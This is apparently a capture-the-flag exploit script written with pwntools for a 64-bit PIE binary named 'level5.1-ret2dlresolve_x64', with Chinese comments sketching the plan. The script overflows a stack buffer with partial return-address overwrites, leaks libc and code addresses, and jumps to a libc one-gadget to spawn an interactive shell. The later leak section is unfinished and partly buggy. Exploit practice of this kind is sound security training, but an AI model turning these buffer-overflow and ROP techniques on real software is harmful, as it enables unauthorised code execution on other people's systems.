#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./level5.1-ret2dlresolve_x64"
elf=ELF(pwn_file)
libc = ELF("./bc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team", 23005)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

r.recvuntil("What is your name?\n")
r.sendline('a'*0x10)
r.recvuntil("Will you eat this 64-bit PIE once again\n")

'''
# 覆盖一点----把0覆盖掉，然后返回
1. 循环覆盖返回地址的最低位，跳回bug_function,,确定加载地址段
2. 通过got表，泄露libc的地址 #不提供libc， 自己通过两个地址确定版本号
2.1. system("/bin/sh")?
3. 通过return-to-dlresolve调用“/bin/sh”   
3. 先尝试 roputils

****重复以上循环，可以泄露代码加载位置 安上面思路
1.可以泄露libc和stack的地址
2.可能只知道ld上的一个值
'''
# read()
payload = 'b'*0x28 + chr(0x7d) 

r.sendline(payload)


r.sendline('c'*0x8)
# add_1 on libc_bss
addr_1 = r.recvuntil(chr(0x7f))
addr_1 = addr_1[-6:]+ chr(0)+chr(0)
addr_1 = u64(addr_1)
libc.address = addr_1 - 0x20830
print hex(libc.address)
print hex(addr_1)
r.recvuntil("Will you eat this 64-bit PIE once again\n")


payload2 = 'd'*0x28 + chr(0x7d)
r.sendline(payload2)

# debug()
r.sendline('e'*0x10)
# add_2 on text
addr_2 = r.recvuntil('\n')
addr_2 = addr_2[-7:-1] + chr(0)+chr(0)
addr_2 = u64(addr_2)

addr_text = addr_2 - 0x7a0 
print hex(addr_2)
r.recvuntil("Will you eat this 64-bit PIE once again\n")

bug_func= addr_text + 0xA44
write_pos = 0x201020  + addr_text
strlen_pos = 0x201028 + addr_text

csu_addr = 0xB6a + addr_text
loop_addr =0xb50 + addr_text

csu_addr = 0x45216 + libc.address
#write_addr = 0x997 + addr_text
rop1 = [
        0x28*'a' + p64(csu_addr)]# + p64(0) + p64(1) + p64(write_pos) + p64(8) + p64(write_pos) + p64(1) + p64(loop_addr), p64(0)*7,p64(bug_func)]

debug()
payload1 = ''.join(rop1)
r.sendline(payload1)

r.interactive()

libc_write = r.recv(8)
print libc_write
#libc_write = u64(libc_write)

r.recvuntil("What is your name?\n")
r.sendline('e'*0x10)

r.recvuntil("Will you eat this 64-bit PIE once again\n")

rop2 = [
0x28*'a' + p64(csu_addr) + p64(0) + p64(2) + p64(write_pos) + p64(8) + p64(strlen_pos) + p64(1) + p64(loop_addr)+ p64(bug_func)]


payload2 = ''.join(rop2)
r.sendline(payload2)
libc_strlen = r.recv(8)
libc_strlen = u64(libc_write)

print 'libc_write:' + hex(libc_write)
print 'libc_strlen:'+ hex(libc_strlen)

# 2次returntocsu; 泄露write和strlen地址
# 计算libc版本
# 调用libc-onegadget 或者搜索

r.sendline()
r.interactive()
